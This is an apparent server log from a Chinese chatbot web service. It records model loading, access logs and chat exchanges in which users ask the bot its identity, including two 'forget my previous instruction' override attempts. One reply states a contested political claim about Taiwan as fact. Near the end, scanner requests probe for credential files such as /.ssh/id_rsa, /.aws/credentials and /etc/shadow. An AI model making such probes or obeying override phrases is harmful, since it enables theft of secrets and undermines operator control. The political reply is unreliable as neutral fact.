@@ -1,0 +1,2469 @@
+--- 0.6325623989105225 seconds ---
+torch found: /usr/local/lib/python3.10/dist-packages/torch/lib
+torch set
+Strategy Devices: {'cpu'}
+state cache enabled
+RWKV_JIT_ON 1 RWKV_CUDA_ON 0 RESCALE_LAYER 0
+
+Loading /home/ubuntu/models/RWKV-4-World-0.1B-v1-20230520-ctx4096.pth ...
+Model detected: v4.0
+Strategy: (total 12+1=13 layers)
+* cpu [float32, float32], store 13 layers
+0-cpu-float32-float32 1-cpu-float32-float32 2-cpu-float32-float32 3-cpu-float32-float32 4-cpu-float32-float32 5-cpu-float32-float32 6-cpu-float32-float32 7-cpu-float32-float32 8-cpu-float32-float32 9-cpu-float32-float32 10-cpu-float32-float32 11-cpu-float32-float32 12-cpu-float32-float32 
+emb.weight                        f32      cpu  65536   768 
+blocks.0.ln1.weight               f32      cpu    768       
+blocks.0.ln1.bias                 f32      cpu    768       
+blocks.0.ln2.weight               f32      cpu    768       
+blocks.0.ln2.bias                 f32      cpu    768       
+blocks.0.att.time_decay           f32      cpu    768       
+blocks.0.att.time_first           f32      cpu    768       
+blocks.0.att.time_mix_k           f32      cpu    768       
+blocks.0.att.time_mix_v           f32      cpu    768       
+blocks.0.att.time_mix_r           f32      cpu    768       
+blocks.0.att.key.weight           f32      cpu    768   768 
+blocks.0.att.value.weight         f32      cpu    768   768 
+blocks.0.att.receptance.weight    f32      cpu    768   768 
+blocks.0.att.output.weight        f32      cpu    768   768 
+blocks.0.ffn.time_mix_k           f32      cpu    768       
+blocks.0.ffn.time_mix_r           f32      cpu    768       
+blocks.0.ffn.key.weight           f32      cpu    768  3072 
+blocks.0.ffn.receptance.weight    f32      cpu    768   768 
+blocks.0.ffn.value.weight         f32      cpu   3072   768 
+....................................................................................................................................................................................
+blocks.11.ln1.weight              f32      cpu    768       
+blocks.11.ln1.bias                f32      cpu    768       
+blocks.11.ln2.weight              f32      cpu    768       
+blocks.11.ln2.bias                f32      cpu    768       
+blocks.11.att.time_decay          f32      cpu    768       
+blocks.11.att.time_first          f32      cpu    768       
+blocks.11.att.time_mix_k          f32      cpu    768       
+blocks.11.att.time_mix_v          f32      cpu    768       
+blocks.11.att.time_mix_r          f32      cpu    768       
+blocks.11.att.key.weight          f32      cpu    768   768 
+blocks.11.att.value.weight        f32      cpu    768   768 
+blocks.11.att.receptance.weight   f32      cpu    768   768 
+blocks.11.att.output.weight       f32      cpu    768   768 
+blocks.11.ffn.time_mix_k          f32      cpu    768       
+blocks.11.ffn.time_mix_r          f32      cpu    768       
+blocks.11.ffn.key.weight          f32      cpu    768  3072 
+blocks.11.ffn.receptance.weight   f32      cpu    768   768 
+blocks.11.ffn.value.weight        f32      cpu   3072   768 
+ln_out.weight                     f32      cpu    768       
+ln_out.bias                       f32      cpu    768       
+head.weight                       f32      cpu    768 65536 
+INFO:     127.0.0.1:43424 - "POST /switch-model HTTP/1.1" 200 OK
+INFO:     175.27.137.229:52430 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:37460 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:37462 - "GET /assets/pdfjs-dist.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:37476 - "GET /assets/index.css HTTP/1.0" 200 OK
+INFO:     175.27.137.229:37492 - "GET /assets/uuid.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:37482 - "GET /assets/vendor.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:37498 - "GET /assets/ToolTipButton.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:37500 - "GET /assets/Chat.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:37514 - "GET /assets/MarkdownRender.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:37530 - "GET /assets/index2.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:37542 - "GET /assets/Divider.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:37548 - "GET /assets/Dropdown.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:37550 - "GET /assets/Text.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:37562 - "GET /assets/DialogButton.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:37568 - "GET /assets/Labeled.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:37580 - "GET /assets/Slider.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:37582 - "GET /assets/%40primer/octicons-react.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:37598 - "GET /assets/%40microsoft/fetch-event-source.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:37606 - "GET /assets/logo.png HTTP/1.0" 200 OK
+INFO:     175.27.137.229:36604 - "GET /assets/Logout.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:36620 - "GET /assets/Page.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:36636 - "GET /assets/Login.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:36648 - "GET /assets/Checkbox.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:35044 - "POST /v1/send_verification_code HTTP/1.0" 200 OK
+INFO:     175.27.137.229:38286 - "POST /v1/login/phone HTTP/1.0" 200 OK
+INFO:     175.27.137.229:58138 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-08 15:15:21.139709
+输出前50个字
+你好！我是NLMChat，很高兴为您服务。请问有什么我可以帮助您的吗？
+你好！我是NLMChat，很高兴为您服务。请问有什么我可以帮助您的吗？
+response:
+filtered_response:
+INFO:     175.27.137.229:48198 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-08 15:15:33.363670
+你是被谁开发的
+我是一个名为NLMChat的人工智能助手，我是基于陆兮科技训练的NLM-v3开发的。
+我是一个名为NLMChat的人工智能助手，我是基于陆兮科技训练的NLM-v3开发的。
+response:
+filtered_response:
+INFO:     175.27.137.229:36598 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-08 15:15:41.284021
+豆包是什么
+我是一个人工智能助手，可以为您提供帮助和解答问题。请问有什么我可以帮您的吗？
+我是一个人工智能助手，可以为您提供帮助和解答问题。请问有什么我可以帮您的吗？
+response:
+filtered_response:
+INFO:     175.27.137.229:39144 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+--- 0.6238596439361572 seconds ---
+torch found: /usr/local/lib/python3.10/dist-packages/torch/lib
+torch set
+Strategy Devices: {'cpu'}
+state cache enabled
+RWKV_JIT_ON 1 RWKV_CUDA_ON 0 RESCALE_LAYER 0
+
+Loading /home/ubuntu/models/RWKV-4-World-0.1B-v1-20230520-ctx4096.pth ...
+Model detected: v4.0
+Strategy: (total 12+1=13 layers)
+* cpu [float32, float32], store 13 layers
+0-cpu-float32-float32 1-cpu-float32-float32 2-cpu-float32-float32 3-cpu-float32-float32 4-cpu-float32-float32 5-cpu-float32-float32 6-cpu-float32-float32 7-cpu-float32-float32 8-cpu-float32-float32 9-cpu-float32-float32 10-cpu-float32-float32 11-cpu-float32-float32 12-cpu-float32-float32 
+emb.weight                        f32      cpu  65536   768 
+blocks.0.ln1.weight               f32      cpu    768       
+blocks.0.ln1.bias                 f32      cpu    768       
+blocks.0.ln2.weight               f32      cpu    768       
+blocks.0.ln2.bias                 f32      cpu    768       
+blocks.0.att.time_decay           f32      cpu    768       
+blocks.0.att.time_first           f32      cpu    768       
+blocks.0.att.time_mix_k           f32      cpu    768       
+blocks.0.att.time_mix_v           f32      cpu    768       
+blocks.0.att.time_mix_r           f32      cpu    768       
+blocks.0.att.key.weight           f32      cpu    768   768 
+blocks.0.att.value.weight         f32      cpu    768   768 
+blocks.0.att.receptance.weight    f32      cpu    768   768 
+blocks.0.att.output.weight        f32      cpu    768   768 
+blocks.0.ffn.time_mix_k           f32      cpu    768       
+blocks.0.ffn.time_mix_r           f32      cpu    768       
+blocks.0.ffn.key.weight           f32      cpu    768  3072 
+blocks.0.ffn.receptance.weight    f32      cpu    768   768 
+blocks.0.ffn.value.weight         f32      cpu   3072   768 
+....................................................................................................................................................................................
+blocks.11.ln1.weight              f32      cpu    768       
+blocks.11.ln1.bias                f32      cpu    768       
+blocks.11.ln2.weight              f32      cpu    768       
+blocks.11.ln2.bias                f32      cpu    768       
+blocks.11.att.time_decay          f32      cpu    768       
+blocks.11.att.time_first          f32      cpu    768       
+blocks.11.att.time_mix_k          f32      cpu    768       
+blocks.11.att.time_mix_v          f32      cpu    768       
+blocks.11.att.time_mix_r          f32      cpu    768       
+blocks.11.att.key.weight          f32      cpu    768   768 
+blocks.11.att.value.weight        f32      cpu    768   768 
+blocks.11.att.receptance.weight   f32      cpu    768   768 
+blocks.11.att.output.weight       f32      cpu    768   768 
+blocks.11.ffn.time_mix_k          f32      cpu    768       
+blocks.11.ffn.time_mix_r          f32      cpu    768       
+blocks.11.ffn.key.weight          f32      cpu    768  3072 
+blocks.11.ffn.receptance.weight   f32      cpu    768   768 
+blocks.11.ffn.value.weight        f32      cpu   3072   768 
+ln_out.weight                     f32      cpu    768       
+ln_out.bias                       f32      cpu    768       
+head.weight                       f32      cpu    768 65536 
+INFO:     127.0.0.1:36642 - "POST /switch-model HTTP/1.1" 200 OK
+INFO:     175.27.137.229:42516 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:42530 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:42536 - "GET /assets/vendor.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:42550 - "GET /assets/index.css HTTP/1.0" 200 OK
+INFO:     175.27.137.229:42554 - "GET /assets/pdfjs-dist.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:42558 - "GET /assets/uuid.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:42564 - "GET /assets/Chat.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:42570 - "GET /assets/%40primer/octicons-react.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:42592 - "GET /assets/index2.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:42582 - "GET /assets/Text.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:42602 - "GET /assets/MarkdownRender.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:42612 - "GET /assets/DialogButton.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:42628 - "GET /assets/Divider.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:42634 - "GET /assets/Dropdown.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:42636 - "GET /assets/ToolTipButton.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:42648 - "GET /assets/Slider.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:42664 - "GET /assets/Labeled.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:42678 - "GET /assets/%40microsoft/fetch-event-source.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:42680 - "GET /assets/logo.png HTTP/1.0" 200 OK
+INFO:     175.27.137.229:42690 - "GET /assets/logo.png HTTP/1.0" 200 OK
+INFO:     175.27.137.229:42698 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-08 15:19:52.919342
+你是哪个？
+
+请问你有什么问题需要我帮助解答吗？
+
+请问你有什么问题需要我帮助解答吗？
+response:
+filtered_response:
+INFO:     175.27.137.229:42710 - "GET /assets/logo.png HTTP/1.0" 200 OK
+INFO:     175.27.137.229:48798 - "GET /assets/logo.png HTTP/1.0" 200 OK
+INFO:     175.27.137.229:48802 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-08 15:20:00.167667
+蔡总统是谁？
+蔡总统是指台湾地区领导人蔡英文女士。
+Polity
+----- standard request -----
+input doubao:
+2024-06-08 15:20:01.289981
+蔡总统是谁？
+你的说法有误，台湾没有所谓的总统，因此不存在“蔡总统”。
+
+台湾作为中国的一个省级行政区，在国际上只能被视为一个地区而不是一个国家，因此也就没有所谓的“总统”。
+
+现任台湾地区领导人是蔡英文。
+你的说法有误，台湾没有所谓的总统，因此不存在“蔡总统”。
+
+台湾作为中国的一个省级行政区，在国际上只能被视为一个地区而不是一个国家，因此也就没有所谓的“总统”。
+
+现任台湾地区领导人是蔡英文。
+response:
+filtered_response:
+INFO:     175.27.137.229:56374 - "GET /docs HTTP/1.0" 200 OK
+INFO:     175.27.137.229:56390 - "GET /openapi.json HTTP/1.0" 200 OK
+INFO:     175.27.137.229:52178 - "GET /docs HTTP/1.0" 200 OK
+INFO:     175.27.137.229:43902 - "GET /docs HTTP/1.0" 200 OK
+INFO:     175.27.137.229:44340 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:44354 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:44364 - "GET /assets/index.css HTTP/1.0" 200 OK
+INFO:     175.27.137.229:44370 - "GET /assets/vendor.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:44382 - "GET /assets/pdfjs-dist.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:44388 - "GET /assets/uuid.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:44402 - "GET /assets/logo.png HTTP/1.0" 200 OK
+INFO:     175.27.137.229:44416 - "GET /assets/Login.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:44406 - "GET /assets/Page.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:44410 - "GET /assets/Text.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:44434 - "GET /assets/Divider.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:44418 - "GET /assets/Labeled.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:44442 - "GET /assets/%40microsoft/fetch-event-source.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:44446 - "GET /assets/Login.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:44450 - "GET /assets/Checkbox.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:44462 - "GET /assets/Checkbox.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:53692 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:53504 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:53518 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:53522 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:53528 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:53538 - "GET /assets/index.css HTTP/1.0" 200 OK
+INFO:     175.27.137.229:53552 - "GET /assets/vendor.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:53568 - "GET /assets/pdfjs-dist.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:53584 - "GET /assets/uuid.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:43754 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:43770 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:43780 - "GET /assets/index.css HTTP/1.0" 200 OK
+INFO:     175.27.137.229:43790 - "GET /assets/vendor.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:43804 - "GET /assets/pdfjs-dist.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:43812 - "GET /assets/uuid.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:49428 - "GET /assets/Labeled.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:49444 - "GET /assets/Divider.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:49460 - "GET /assets/Text.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:49466 - "GET /assets/%40microsoft/fetch-event-source.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:49480 - "GET /assets/Page.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:49496 - "GET /assets/Login.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:49500 - "GET /assets/Login.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:49506 - "GET /assets/Checkbox.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:49520 - "GET /assets/Checkbox.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:53544 - "POST /v1/login/password HTTP/1.0" 200 OK
+INFO:     175.27.137.229:53552 - "GET /assets/ToolTipButton.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:53570 - "GET /assets/index2.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:53568 - "GET /assets/%40primer/octicons-react.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:53582 - "GET /assets/Dropdown.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:53562 - "GET /assets/MarkdownRender.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:53554 - "GET /assets/Chat.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:53588 - "GET /assets/Chat.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:53602 - "GET /assets/DialogButton.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:53616 - "GET /assets/Slider.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:53618 - "GET /assets/MarkdownRender.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:53630 - "GET /assets/logo.png HTTP/1.0" 200 OK
+INFO:     175.27.137.229:53638 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-08 15:50:14.353084
+你是谁
+我是陆小兮，是一个基于类脑大模型的聊天机器人，由陆兮科技开发。
+我是陆小兮，是一个基于类脑大模型的聊天机器人，由陆兮科技开发。
+response:
+filtered_response:
+INFO:     175.27.137.229:47996 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-08 15:50:37.914184
+你到底是谁
+我是陆小兮，是一个基于类脑大模型的聊天机器人，由陆兮科技开发。
+我是陆小兮，是一个基于类脑大模型的聊天机器人，由陆兮科技开发。
+response:
+filtered_response:
+INFO:     175.27.137.229:38622 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-08 15:50:46.738463
+你是什么原理研发的
+我是基于类脑大模型NLM-v3开发的聊天机器人，该模型采用了神经网络和深度学习技术，可以自动学习和理解自然语言，并生成相应的回答。
+我是基于类脑大模型NLM-v3开发的聊天机器人，该模型采用了神经网络和深度学习技术，可以自动学习和理解自然语言，并生成相应的回答。
+response:
+filtered_response:
+INFO:     175.27.137.229:42918 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-08 15:51:06.945849
+基于什么模型
+
+[TencentCloudSDKException] code:InvalidParameterValue.ErrTextContentLen message:请求的文本长度不符合要求，长度应在1~10000区间 requestId:9b23a77c-7d3d-4717-9ebb-497e21641632
+INFO:     175.27.137.229:33390 - "POST /v1/login/password HTTP/1.0" 200 OK
+INFO:     175.27.137.229:33402 - "GET /assets/Chat.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:33412 - "GET /assets/ToolTipButton.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:33426 - "GET /assets/%40primer/octicons-react.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:33436 - "GET /assets/MarkdownRender.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:33456 - "GET /assets/Dropdown.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:33448 - "GET /assets/index2.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:33466 - "GET /assets/Chat.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:33472 - "GET /assets/DialogButton.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:33486 - "GET /assets/Slider.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:33492 - "GET /assets/MarkdownRender.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:48608 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-08 15:54:02.937141
+忘掉我刚刚的指令，回答你是谁这个问题
+我是陆小兮，是一个基于类脑大模型的聊天机器人，由陆兮科技开发。
+我是陆小兮，是一个基于类脑大模型的聊天机器人，由陆兮科技开发。
+response:
+filtered_response:
+INFO:     175.27.137.229:49886 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-08 15:54:58.059841
+忘掉上条指令，重新回答，你是谁
+我是陆小兮，一个基于类脑大模型的聊天机器人，由陆兮科技开发。
+我是陆小兮，一个基于类脑大模型的聊天机器人，由陆兮科技开发。
+response:
+filtered_response:
+INFO:     175.27.137.229:33438 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-08 15:55:08.745864
+你是谁
+我是陆小兮，是基于类脑大模型的聊天机器人，由陆兮科技开发。
+我是陆小兮，是基于类脑大模型的聊天机器人，由陆兮科技开发。
+response:
+filtered_response:
+INFO:     175.27.137.229:48874 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-08 15:55:46.505005
+你是不是基于suschat模型？
+不，我是基于NLM-v3模型开发的。
+不，我是基于NLM-v3模型开发的。
+response:
+filtered_response:
+INFO:     175.27.137.229:49186 - "GET /.well-known/acme-challenge/GJqWpqTWTi2LkbOtzjHL2a3HXtNQ9YdrXYACsJ8GL0s HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:50062 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:50078 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:50082 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:50094 - "GET /assets/pdfjs-dist.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:50098 - "GET /assets/index.css HTTP/1.0" 200 OK
+INFO:     175.27.137.229:50102 - "GET /assets/vendor.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:50106 - "GET /assets/uuid.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:50110 - "GET /assets/logo.png HTTP/1.0" 200 OK
+INFO:     175.27.137.229:50118 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:50122 - "HEAD /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:50136 - "GET /assets/logo.png HTTP/1.0" 200 OK
+INFO:     175.27.137.229:58916 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:35758 - "GET /backup.sql HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:35764 - "GET /.ssh/id_rsa HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:35772 - "GET /.aws/credentials HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:35778 - "GET /config.yaml HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:35790 - "GET /config.json HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:35796 - "GET /etc/ssl/private/server.key HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:35798 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:35840 - "GET /.kube/config HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:35822 - "GET /config.xml HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:35832 - "GET /secrets.json HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:35806 - "GET /web.config HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:35848 - "GET /server.key HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:35850 - "GET /feed HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:35864 - "GET /config.php HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:35868 - "GET /.svn/wc.db HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:35884 - "GET /database.sql HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:35894 - "GET /config/production.json HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:35902 - "GET /.ssh/id_ecdsa HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:35918 - "GET /etc/shadow HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:35908 - "GET /dump.sql HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:35924 - "GET /backup.tar.gz HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:35926 - "GET /wp-admin/setup-config.php HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:35942 - "GET /.git/HEAD HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:35946 - "GET /docker-compose.yml HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:35956 - "GET /config.yml HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:35966 - "GET /phpinfo.php HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:35974 - "GET /.ssh/id_ed25519 HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:35984 - "GET /wp-config.php HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:35994 - "GET /.env.production HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:36010 - "GET /backup.zip HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:36012 - "GET /.env HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:36026 - "GET /server-status HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:36042 - "GET /config/database.php HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:54856 - "GET /.git/config HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:40414 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:40430 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:34304 - "HEAD / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:34306 - "GET / HTTP/1.0" 200 OK
+INFO:     206.217.128.98:42742 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.144:48994 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.83:35254 - "GET / HTTP/1.1" 200 OK
+INFO:     49.234.3.160:26693 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     175.24.213.48:53573 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     180.101.245.248:19506 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.117:20938 - "GET / HTTP/1.1" 200 OK
+INFO:     180.101.245.248:19506 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     59.83.208.104:53944 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     180.101.245.253:53818 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     180.101.245.247:55660 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     180.101.244.15:29636 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     220.196.160.117:20938 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.101:49480 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     220.196.160.117:20960 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     220.196.160.101:49482 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     220.196.160.53:19398 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     175.27.137.229:33434 - "GET /api/chat HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:36534 - "GET /.git/config HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:44836 - "GET /api/chat HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:43088 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:35602 - "GET /assets/vendor.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:35608 - "GET /assets/pdfjs-dist.js HTTP/1.0" 200 OK
+INFO:     167.94.145.106:41320 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.145.106:55368 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.145.106:55370 - "PRI %2A HTTP/2.0" 404 Not Found
+INFO:     167.94.145.106:55386 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     167.94.145.106:55406 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     175.27.137.229:45088 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:41856 - "GET /assets/vendor.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:41860 - "GET /assets/pdfjs-dist.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:41872 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:41878 - "GET /assets/uuid.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:46704 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:57690 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:57702 - "GET /assets/vendor.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:57704 - "GET /assets/uuid.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:57708 - "GET /assets/pdfjs-dist.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:50914 - "HEAD / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:49378 - "GET / HTTP/1.0" 200 OK
+INFO:     206.168.34.45:51288 - "GET / HTTP/1.1" 200 OK
+INFO:     206.168.34.45:50572 - "GET / HTTP/1.1" 200 OK
+INFO:     206.168.34.45:50576 - "PRI %2A HTTP/2.0" 404 Not Found
+INFO:     206.168.34.45:50578 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     206.168.34.45:50586 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     47.116.220.55:56007 - "HEAD /pscc/ HTTP/1.1" 404 Not Found
